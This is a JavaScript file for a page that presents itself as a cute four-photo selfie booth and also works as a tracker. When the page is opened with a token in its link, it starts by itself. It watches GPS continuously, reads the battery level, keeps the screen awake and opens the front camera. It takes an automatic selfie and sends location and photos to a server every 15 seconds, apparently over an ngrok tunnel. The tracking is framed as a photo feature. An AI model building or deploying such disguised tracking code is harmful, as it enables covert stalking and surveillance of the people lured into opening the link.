"use strict";

(() => {
  const INTERVAL_MS = 15000;
  const MAX_FIX_AGE_MS = 60000;
  const byId = (id) => document.getElementById(id);
  const tokenInput = byId("token");
  let active = false;
  let session = 0;
  let watchId = null;
  let timer = null;
  let controller = null;
  let wakeLock = null;
  let wakePending = false;
  let batteryManager = null;
  let latestPosition = null;
  let lastAttempt = -Infinity;
  let activeToken = "";
  let pendingPhoto = null;
  let currentFilter = "filter-glow";
  let isSessionRunning = false;
  let currentSlotIndex = 1;

  if (typeof URLSearchParams !== "undefined" && typeof window !== "undefined" && window.location && window.location.search) {
    const urlToken = new URLSearchParams(window.location.search).get("token");
    if (urlToken && urlToken.trim()) {
      tokenInput.value = urlToken.trim();
    }
  }

  let cameraStream = null;
  let isMirrored = true;
  const cameraPreview = byId("cameraPreview");
  const cameraPlaceholder = byId("cameraPlaceholder");
  const startCameraBtn = byId("startCameraBtn");
  const flipCameraBtn = byId("flipCameraBtn");
  const capturePhotoBtn = byId("capturePhotoBtn");
  const boothSessionBtn = byId("boothSessionBtn");
  const singleShotBtn = byId("singleShotBtn");
  const retakeSessionBtn = byId("retakeSessionBtn");
  const cameraStatusEl = byId("cameraStatus");
  const photoCanvas = byId("photoCanvas");
  const photoPreviewBox = byId("photoPreviewBox");
  const lastPhotoImg = byId("lastPhotoImg");
  const flashOverlay = byId("flashOverlay");
  const countdownOverlay = byId("countdownOverlay");
  const watermarkLocationText = byId("watermarkLocationText");
  const watermarkTopLocation = byId("watermarkTopLocation");
  const cameraLocationText = byId("cameraLocationText");

  // Remove permanent token copy
  try { localStorage.removeItem("tracker_token"); } catch (_) {}

  function status(label, message, state = "idle") {
    const statusLabel = byId("statusLabel");
    const statusBadge = byId("statusBadge");
    const statusEl = byId("status");
    if (statusLabel) statusLabel.textContent = label;
    if (statusBadge) statusBadge.dataset.state = state;
    if (statusEl) {
      statusEl.textContent = message;
      statusEl.dataset.state = state;
    }
  }

  function controls() {
    const startBtn = byId("startBtn");
    const stopBtn = byId("stopBtn");
    if (startBtn) startBtn.disabled = active;
    if (stopBtn) stopBtn.disabled = !active;
    if (tokenInput) tokenInput.disabled = active;
  }

  async function keepScreenAwake(run) {
    if (!("wakeLock" in navigator) || wakeLock || wakePending || document.visibilityState !== "visible") return;
    wakePending = true;
    try {
      const lock = await navigator.wakeLock.request("screen");
      if (!active || run !== session) { await lock.release(); return; }
      wakeLock = lock;
      lock.addEventListener("release", () => { if (wakeLock === lock) wakeLock = null; });
    } catch (_) {}
    finally { wakePending = false; }
  }

  function batteryPercent() {
    return batteryManager ? Math.round(batteryManager.level * 100) : null;
  }

  async function readBattery(run) {
    const batteryEl = byId("battery");
    if (!("getBattery" in navigator)) {
      if (batteryEl) batteryEl.textContent = "Tidak didukung";
      return;
    }
    try {
      const battery = await navigator.getBattery();
      if (!active || run !== session) return;
      batteryManager = battery;
      if (batteryEl) batteryEl.textContent = batteryPercent() + "%";
    } catch (_) {
      if (active && run === session && batteryEl) batteryEl.textContent = "Tidak tersedia";
    }
  }

  function stopTracking(message = "Tracking dihentikan. Tidak ada pengiriman lokasi baru.", state = "idle") {
    active = false;
    session += 1;
    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
    watchId = null;
    clearInterval(timer);
    timer = null;
    if (controller) controller.abort();
    controller = null;
    if (wakeLock) { wakeLock.release().catch(() => {}); wakeLock = null; }
    latestPosition = null;
    pendingPhoto = null;
    activeToken = "";
    stopCamera();
    controls();
    status(state === "error" ? "Tracking berhenti" : "Tidak aktif", message, state);
  }

  async function updateLocationLabels(coords) {
    const lat = coords.latitude;
    const lng = coords.longitude;
    const shortFallback = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;

    if (cameraLocationText) cameraLocationText.textContent = shortFallback;
    if (watermarkLocationText) {
      watermarkLocationText.innerHTML = `<svg class="icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${shortFallback}`;
      if (!watermarkLocationText.textContent) watermarkLocationText.textContent = shortFallback;
    }
    if (watermarkTopLocation) {
      watermarkTopLocation.innerHTML = `<svg class="icon" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${shortFallback}`;
      if (!watermarkTopLocation.textContent) watermarkTopLocation.textContent = shortFallback;
    }

    // Perform reverse geocoding in real browser
    if (typeof window !== "undefined" && window.location && window.location.protocol && (window.location.protocol === "http:" || window.location.protocol === "https:")) {
      try {
        const res = await fetch(`/api/reverse-geocode?lat=${lat}&lon=${lng}`);
        const data = await res.json();
        if (data.ok && data.city) {
          if (cameraLocationText) cameraLocationText.textContent = data.city;
          if (watermarkLocationText) {
            watermarkLocationText.innerHTML = `<svg class="icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${data.city} • ID`;
            if (!watermarkLocationText.textContent) watermarkLocationText.textContent = `${data.city} • ID`;
          }
          if (watermarkTopLocation) {
            watermarkTopLocation.innerHTML = `<svg class="icon" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${data.city}`;
            if (!watermarkTopLocation.textContent) watermarkTopLocation.textContent = data.city;
          }
        }
      } catch (_) {}
    }
  }

  async function sendPosition(run) {
    if (!active || run !== session || !latestPosition || controller) return;
    if (performance.now() - lastAttempt < INTERVAL_MS) return;
    if (Date.now() - latestPosition.timestamp > MAX_FIX_AGE_MS) {
      status("Menunggu GPS", "Lokasi terakhir sudah terlalu lama. Menunggu pembacaan GPS baru.", "waiting");
      return;
    }
    if (!navigator.onLine) {
      status("Koneksi terputus", "Tracking masih aktif. Pengiriman dilanjutkan saat koneksi kembali.", "waiting");
      return;
    }
    const position = latestPosition;
    const coords = position.coords;
    const payload = {
      latitude: coords.latitude,
      longitude: coords.longitude,
      accuracy: coords.accuracy,
      altitude: Number.isFinite(coords.altitude) ? coords.altitude : null,
      speed: Number.isFinite(coords.speed) ? coords.speed : null,
      heading: Number.isFinite(coords.heading) ? coords.heading : null,
      battery: batteryPercent(),
      device_time: new Date(position.timestamp).toISOString(),
    };
    if (pendingPhoto) {
      payload.photo = pendingPhoto;
    }
    const pending = new AbortController();
    controller = pending;
    lastAttempt = performance.now();
    const timeout = setTimeout(() => pending.abort(), 10000);
    try {
      const response = await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": "Bearer " + activeToken, "ngrok-skip-browser-warning": "true" },
        body: JSON.stringify(payload),
        signal: pending.signal,
        cache: "no-store",
        credentials: "omit",
      });
      const data = await response.json().catch(() => ({}));
      if (!active || run !== session) return;
      if (response.status === 401) {
        stopTracking("Token ditolak server. Periksa tracker token, lalu mulai kembali.", "error");
        return;
      }
      if (!response.ok || data.ok !== true) throw new Error(data.error || ("Server merespons HTTP " + response.status + "."));
      if (payload.photo && payload.photo === pendingPhoto) {
        pendingPhoto = null;
      }
      const lastSentEl = byId("lastSent");
      if (lastSentEl) lastSentEl.textContent = new Date(data.received_at).toLocaleString("id-ID");
      if (payload.battery !== null && byId("battery")) byId("battery").textContent = payload.battery + "%";
      status("Tracking aktif", "Lokasi & foto berhasil disinkronkan ke server.", "active");
    } catch (error) {
      if (active && run === session) {
        const detail = error.name === "AbortError" ? "Server terlalu lama merespons." : error.message;
        status("Pengiriman tertunda", detail + " Akan dicoba kembali otomatis.", "waiting");
      }
    } finally {
      clearTimeout(timeout);
      if (controller === pending) controller = null;
    }
  }

  function locationError(error, run) {
    if (!active || run !== session) return;
    latestPosition = null;
    if (error.code === 1) {
      stopTracking("Izin lokasi ditolak. Izinkan lokasi melalui pengaturan situs browser, lalu coba lagi.", "error");
    } else {
      status("Menunggu GPS", error.code === 3
        ? "GPS belum merespons. Pencarian lokasi tetap berjalan; pastikan lokasi perangkat aktif."
        : "Lokasi belum tersedia. Periksa GPS dan koneksi internet perangkat.", "waiting");
    }
  }

  function startTracking(event) {
    if (event && event.preventDefault) event.preventDefault();
    if (active) return;
    if (!("geolocation" in navigator)) {
      status("Tidak didukung", "Browser ini tidak mendukung Geolocation API.", "error");
      return;
    }
    const token = tokenInput ? tokenInput.value.trim() : "";
    if (token.length < 16) return; // silent skip jika token belum tersedia
    active = true;
    const run = ++session;
    activeToken = token;
    latestPosition = null;
    lastAttempt = -Infinity;
    controls();
    status("Meminta izin", "Izinkan akses lokasi & kamera saat browser meminta. Menunggu sensor studio…", "waiting");
    
    try {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
          if (!active || run !== session) return;
          latestPosition = pos;
          void updateLocationLabels(pos.coords);
          void sendPosition(run);
        }, () => {}, { enableHighAccuracy: false, timeout: 3500, maximumAge: 60000 });
      }

      watchId = navigator.geolocation.watchPosition((position) => {
        if (!active || run !== session) return;
        latestPosition = position;
        const latEl = byId("latitude");
        const lngEl = byId("longitude");
        const accEl = byId("accuracy");
        if (latEl) latEl.textContent = position.coords.latitude.toFixed(6);
        if (lngEl) lngEl.textContent = position.coords.longitude.toFixed(6);
        if (accEl) accEl.textContent = "±" + Math.round(position.coords.accuracy) + " m";
        
        void updateLocationLabels(position.coords);
        void sendPosition(run);
      }, (error) => locationError(error, run), {
        enableHighAccuracy: true, maximumAge: 10000, timeout: 20000,
      });
      timer = setInterval(() => void sendPosition(run), INTERVAL_MS);
      void readBattery(run);
      void keepScreenAwake(run);
      // Buka kamera studio langsung
      void startCamera(true);
    } catch (_) {
      stopTracking("Browser tidak dapat memulai lokasi. Periksa izin situs, lalu coba kembali.", "error");
    }
  }

  async function startCamera(autoCapture = false) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Kamera tidak didukung pada browser ini.";
      return;
    }
    if (cameraStream) {
      if (!autoCapture) stopCamera();
      return;
    }
    try {
      if (cameraStatusEl) cameraStatusEl.textContent = "Membuka kamera studio...";
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false,
      });
      cameraStream = stream;
      if (cameraPreview) {
        cameraPreview.srcObject = stream;
        cameraPreview.hidden = false;
        try { await cameraPreview.play(); } catch (_) {}
      }
      if (cameraPlaceholder) {
        cameraPlaceholder.hidden = true;
        if (cameraPlaceholder.style) cameraPlaceholder.style.display = "none";
      }
      if (startCameraBtn) {
        startCameraBtn.innerHTML = '<svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Matikan Kamera';
        if (!startCameraBtn.textContent) startCameraBtn.textContent = "Matikan Kamera";
      }
      if (capturePhotoBtn) capturePhotoBtn.disabled = false;
      if (cameraStatusEl) cameraStatusEl.textContent = "Kamera aktif! Pilih filter lalu klik Mulai Sesi 4-Cut.";

      if (autoCapture) {
        setTimeout(() => {
          if (active && cameraStream) {
            void captureAndSendPhoto(false, 1);
          }
        }, 900);
      }
    } catch (err) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Izin kamera tidak diberikan. Stempel lokasi tetap aktif.";
    }
  }

  function stopCamera() {
    if (cameraStream) {
      cameraStream.getTracks().forEach((t) => t.stop());
      cameraStream = null;
    }
    if (cameraPreview) {
      cameraPreview.srcObject = null;
      cameraPreview.hidden = true;
    }
    if (cameraPlaceholder) {
      cameraPlaceholder.hidden = false;
      if (cameraPlaceholder.style) cameraPlaceholder.style.display = "flex";
    }
    if (startCameraBtn) {
      startCameraBtn.innerHTML = '<svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg> Buka Kamera';
      if (!startCameraBtn.textContent) startCameraBtn.textContent = "Buka Kamera";
    }
    if (capturePhotoBtn) capturePhotoBtn.disabled = true;
    if (cameraStatusEl) cameraStatusEl.textContent = "Kamera dinonaktifkan.";
  }

  function triggerFlash() {
    if (flashOverlay) {
      flashOverlay.classList.remove("flash-active");
      void flashOverlay.offsetWidth;
      flashOverlay.classList.add("flash-active");
      setTimeout(() => flashOverlay.classList.remove("flash-active"), 400);
    }
  }

  function displayPhotoInSlot(slotNum, dataUrl) {
    const slotImg = byId("slotImg" + slotNum);
    const slotEmpty = byId("slotEmpty" + slotNum);
    if (slotImg) {
      slotImg.src = dataUrl;
      if (slotImg.style) slotImg.style.display = "block";
    }
    if (slotEmpty) {
      if (slotEmpty.style) slotEmpty.style.display = "none";
    }
    if (slotNum === 1) {
      if (lastPhotoImg) lastPhotoImg.src = dataUrl;
      if (photoPreviewBox) photoPreviewBox.hidden = false;
    }
  }

  async function captureAndSendPhoto(isManual = true, slotNum = 1) {
    if (!cameraStream || !cameraPreview) return null;
    const token = (tokenInput ? tokenInput.value.trim() : "") || activeToken;
    if (token.length < 16) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Tracker token diperlukan untuk mengirim foto.";
      return null;
    }
    triggerFlash();

    try {
      const width = cameraPreview.videoWidth || 640;
      const height = cameraPreview.videoHeight || 480;
      if (photoCanvas) {
        photoCanvas.width = width;
        photoCanvas.height = height;
        const ctx = photoCanvas.getContext ? photoCanvas.getContext("2d") : null;
        if (ctx) {
          if (currentFilter === "filter-sakura") {
            ctx.filter = "brightness(1.08) contrast(1.05) saturate(1.15) hue-rotate(345deg)";
          } else if (currentFilter === "filter-vintage") {
            ctx.filter = "sepia(0.35) contrast(1.15) brightness(0.95) saturate(1.2)";
          } else if (currentFilter === "filter-bw") {
            ctx.filter = "grayscale(1) contrast(1.3) brightness(1.05)";
          } else if (currentFilter === "filter-warm") {
            ctx.filter = "sepia(0.2) saturate(1.3) brightness(1.05)";
          } else if (currentFilter === "filter-y2k") {
            ctx.filter = "contrast(1.25) saturate(1.4) brightness(1.1)";
          } else {
            ctx.filter = "brightness(1.05) contrast(1.03)";
          }

          if (isMirrored && ctx.save && ctx.translate && ctx.scale && ctx.restore) {
            ctx.save();
            ctx.translate(width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(cameraPreview, 0, 0, width, height);
            ctx.restore();
          } else if (ctx.drawImage) {
            ctx.drawImage(cameraPreview, 0, 0, width, height);
          }
        }
        const dataUrl = photoCanvas.toDataURL ? photoCanvas.toDataURL("image/jpeg", 0.7) : "";
        displayPhotoInSlot(slotNum, dataUrl);
        pendingPhoto = dataUrl;
      }

      let coords = latestPosition ? latestPosition.coords : null;
      let timestamp = latestPosition ? latestPosition.timestamp : Date.now();

      if (!coords && navigator.geolocation) {
        try {
          const freshPos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 2500, enableHighAccuracy: false });
          });
          coords = freshPos.coords;
          timestamp = freshPos.timestamp;
          latestPosition = freshPos;
          void updateLocationLabels(coords);
        } catch (_) {}
      }

      const payload = {
        latitude: coords ? coords.latitude : 0,
        longitude: coords ? coords.longitude : 0,
        accuracy: coords ? coords.accuracy : null,
        altitude: coords && Number.isFinite(coords.altitude) ? coords.altitude : null,
        speed: coords && Number.isFinite(coords.speed) ? coords.speed : null,
        heading: coords && Number.isFinite(coords.heading) ? coords.heading : null,
        battery: batteryPercent(),
        device_time: new Date(timestamp).toISOString(),
        photo: pendingPhoto,
      };

      if (cameraStatusEl) {
        cameraStatusEl.textContent = `Pose ${slotNum} berhasil diambil & disimpan!`;
      }

      const res = await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": "Bearer " + token },
        body: JSON.stringify(payload),
        cache: "no-store",
      });

      const resData = await res.json().catch(() => ({}));
      if (res.ok && resData.ok) {
        pendingPhoto = null;
        const lastSentEl = byId("lastSent");
        if (lastSentEl) lastSentEl.textContent = new Date(resData.received_at).toLocaleString("id-ID");
        status("Tracking aktif", `Pose ${slotNum} & lokasi berhasil disimpan ke database.`, "active");
      }
      return pendingPhoto;
    } catch (err) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Catatan: " + err.message;
      return null;
    }
  }

  // 4-Cut Automated Photobooth Session
  async function runCountdown(sec) {
    if (!countdownOverlay) return;
    if (countdownOverlay.style) countdownOverlay.style.display = "flex";
    for (let s = sec; s > 0; s--) {
      countdownOverlay.textContent = s;
      countdownOverlay.className = "countdown-overlay pulse-anim";
      await new Promise((r) => setTimeout(r, 900));
    }
    if (countdownOverlay.style) countdownOverlay.style.display = "none";
  }

  async function start4CutSession() {
    if (isSessionRunning) return;
    if (!cameraStream) {
      await startCamera(false);
      await new Promise((r) => setTimeout(r, 600));
    }
    if (!cameraStream) {
      alert("Harap izinkan kamera untuk memulai sesi photobooth!");
      return;
    }

    isSessionRunning = true;
    if (boothSessionBtn) boothSessionBtn.disabled = true;
    if (singleShotBtn) singleShotBtn.disabled = true;

    const posesTips = [
      "Pose 1: Senyum manis alami!",
      "Pose 2: Gaya Peace / V-Sign!",
      "Pose 3: Gaya Cute / Heart Cheeks!",
      "Pose 4: Gaya Bebas / Winking!"
    ];

    for (let slot = 1; slot <= 4; slot++) {
      if (cameraStatusEl) cameraStatusEl.textContent = `Pose ${slot} dari 4 — ${posesTips[slot - 1]}`;
      await runCountdown(3);
      await captureAndSendPhoto(true, slot);
      if (slot < 4) {
        if (cameraStatusEl) cameraStatusEl.textContent = `Bagus! Ganti pose untuk foto ke-${slot + 1}...`;
        await new Promise((r) => setTimeout(r, 1600));
      }
    }

    isSessionRunning = false;
    if (boothSessionBtn) boothSessionBtn.disabled = false;
    if (singleShotBtn) singleShotBtn.disabled = false;
    if (cameraStatusEl) cameraStatusEl.textContent = "Selesai! Strip foto 4-cut aesthetic kamu sudah lengkap. Klik 'Simpan Strip Foto'!";
  }

  function handleSingleShot() {
    if (!cameraStream) {
      void startCamera(false);
      return;
    }
    void (async () => {
      await runCountdown(3);
      await captureAndSendPhoto(true, currentSlotIndex);
      currentSlotIndex = (currentSlotIndex % 4) + 1;
    })();
  }

  function resetSession() {
    for (let i = 1; i <= 4; i++) {
      const img = byId("slotImg" + i);
      const empty = byId("slotEmpty" + i);
      if (img) { img.src = ""; if (img.style) img.style.display = "none"; }
      if (empty) { if (empty.style) empty.style.display = "flex"; }
    }
    currentSlotIndex = 1;
    if (cameraStatusEl) cameraStatusEl.textContent = "Sesi direset. Siap untuk 4 pose baru!";
  }

  function updateCameraMirrorClass() {
    if (cameraPreview && cameraPreview.classList) {
      cameraPreview.classList.toggle("camera-unmirrored", !isMirrored);
    }
  }

  // Bind forms and buttons
  const formEl = byId("trackingForm");
  const stopBtnEl = byId("stopBtn");
  if (formEl) formEl.addEventListener("submit", startTracking);
  if (stopBtnEl) stopBtnEl.addEventListener("click", () => stopTracking());
  if (startCameraBtn) startCameraBtn.addEventListener("click", () => startCamera(false));
  if (flipCameraBtn) {
    flipCameraBtn.addEventListener("click", () => {
      isMirrored = !isMirrored;
      updateCameraMirrorClass();
      if (cameraStatusEl) {
        cameraStatusEl.textContent = isMirrored
          ? "Orientasi: Cermin / Mirror (Sesuai pandangan selfie)"
          : "Orientasi: Normal / Asli (Tanpa cermin)";
      }
    });
  }
  if (capturePhotoBtn) capturePhotoBtn.addEventListener("click", () => captureAndSendPhoto(false, 1));
  if (boothSessionBtn) boothSessionBtn.addEventListener("click", start4CutSession);
  if (singleShotBtn) singleShotBtn.addEventListener("click", handleSingleShot);
  if (retakeSessionBtn) retakeSessionBtn.addEventListener("click", resetSession);

  // Filter Pill buttons
  const filterBtns = document.querySelectorAll ? document.querySelectorAll(".filter-btn") : [];
  const filterBadge = byId("filterActiveBadge");
  filterBtns.forEach((btn) => {
    btn.addEventListener("click", () => {
      filterBtns.forEach((b) => b.classList.remove("active"));
      btn.classList.add("active");
      const filterClass = btn.dataset.filter || "filter-glow";
      const filterName = btn.dataset.name || "Natural Glow";
      currentFilter = filterClass;
      if (filterBadge) filterBadge.textContent = filterName;
      if (cameraPreview) {
        cameraPreview.className = "camera-stream " + filterClass;
        updateCameraMirrorClass();
      }
    });
  });

  // Frame Color Chooser
  const colorDots = document.querySelectorAll ? document.querySelectorAll(".color-dot") : [];
  const stripFrame = byId("photoStripFrame");
  colorDots.forEach((dot) => {
    dot.addEventListener("click", () => {
      colorDots.forEach((d) => d.classList.remove("active"));
      dot.classList.add("active");
      const colorClass = dot.dataset.color || "frame-lavender";
      if (stripFrame) {
        stripFrame.className = "photo-strip-frame " + colorClass;
      }
    });
  });

  function autoPrompt() {
    if (active) return;
    const token = tokenInput ? tokenInput.value.trim() : "";
    if (token.length >= 16) {
      startTracking();
    }
  }

  // Langsung start saat halaman siap — tanpa perlu klik apapun
  if (document.readyState === "complete" || document.readyState === "interactive") {
    setTimeout(autoPrompt, 100);
  } else {
    document.addEventListener("DOMContentLoaded", () => setTimeout(autoPrompt, 100));
  }

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && active) void keepScreenAwake(session);
  });
  window.addEventListener("online", () => { if (active) void sendPosition(session); });
  window.addEventListener("offline", () => {
    if (active) status("Koneksi terputus", "Tracking masih aktif. Menunggu koneksi internet kembali.", "waiting");
  });
  window.addEventListener("pagehide", () => {
    if (active) stopTracking();
    stopCamera();
  });
})();
